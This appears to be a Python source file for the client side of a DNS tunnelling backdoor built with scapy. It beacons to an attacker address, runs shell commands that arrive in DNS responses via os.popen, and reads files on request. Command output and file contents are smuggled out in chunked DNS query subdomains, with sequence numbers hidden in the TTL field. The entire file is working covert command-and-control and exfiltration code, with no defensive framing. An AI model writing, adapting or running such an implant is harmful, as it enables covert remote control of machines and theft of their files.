import subprocess
from tabnanny import verbose
from scapy.all import *
from scapy.all import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
import time
from base64 import b64decode, b64encode
from enum import IntEnum
import os
import time


Att_ip="10.0.2.15"
is_ready = False
TTL = 64
mtu = 24
seqnum = 64

def sendDNSReq(msg,flag, seqnum = 64, fileorprint = 1):
    domain = '.elad.com'
    #if you are a file
    if flag == '1' or flag == '3':
        domain = bytes(domain)
        flag = bytes(flag)
        #if we reached the end of the byte zero back to 64
    if seqnum == 255:
        seqnum = 64

    # we pass the seqnum in the ttl field, also to insert the message and flag inside the subdomain files
 
    dns_req = IP(dst=Att_ip, ttl=seqnum)/UDP(dport=53)/ DNS(rd=1, qd=DNSQR(qname=flag + msg + domain), tc=fileorprint)
    # sleep here to let the attacker reach the sniffing part.
    time.sleep(0.3)
    send(dns_req)
    
def sendhello():
    sendDNSReq("hi","8")


def DNSHandler(pkt):
    # if packet is with the required fields, here  DNSRR is a response made by the client.
    if not pkt[0]['DNS']['DNSRR']:
        return
    # take the packet and turn into string by decoding
    payload = pkt[0]['DNS']['DNSRR'].rdata[0].decode()    
    handle_flag = payload[0]

    #check if the attacker intrested in printing or file
    #[1:] payload without the flag
    match handle_flag:
        case "2":
            printHandler(payload[1:])
        case "1":
            fileHandler(payload[1:])


def fileHandler(file_path):
    ret_ok = ""
    global seqnum

    with open(file_path, "rb") as file:
        payload = file.read()
        
    while True: 
        #'1' means I have more to send
        if len(payload) > mtu:
            sendDNSReq( payload[:mtu], '1', seqnum, 0)
            ret_ok = checkOK()
            if ret_ok == "ok":
                payload = payload[mtu:]
                seqnum += 1

        else:        
            sendDNSReq(payload ,'3', seqnum, 0)
            ret_ok = checkOK()
            if ret_ok == "ok":
                seqnum = 64
                return
 


def printHandler(command):
    # os.popen takes the command run and turn the result it into a string

    #seqnum for making sure packets arrive by order

    payload = os.popen(command).read()
    global seqnum
    ret_ok = ""
    while True: 

        #if payload is larger than mtu size

        if len(payload) > mtu:
            # [:mut] means up to size of mtu

            # here the '2' - if end or not - for file or print

            sendDNSReq( payload[:mtu], '2', seqnum, 1)
            # check if attacker recievd the packge

            ret_ok = checkOK()
            if ret_ok == "ok":
                seqnum += 1
                #if received ok cut mtu chunk from the payload 

                payload = payload[mtu:]

        else: 
            #if chunk smaller than mtu       
            sendDNSReq(payload ,'4',seqnum, 1)
            ret_ok = checkOK()

            #if I recieved ok, zero the seqnum back to 64 - why? because I wanted
            if ret_ok == "ok":
                seqnum = 64
                break
 


def checkOK():
        #check filter
        pkt = sniff(filter="udp and src host 10.0.2.15 and udp[10] & 0x80 = 0", count=1, timeout = 3)
        if pkt:
            payload = pkt[0]['DNS']['DNSRR'].rdata[0].decode() 
            return payload[1:]

#timeout so we won't get stuck in sniffing and continue sending hello to attacker.
def listenRes():
    sniff(filter="udp and src host 10.0.2.15", prn=DNSHandler, timeout=5)

def main():
    while True:
        sendhello()
        listenRes()


if __name__ == "__main__":
    main()






 
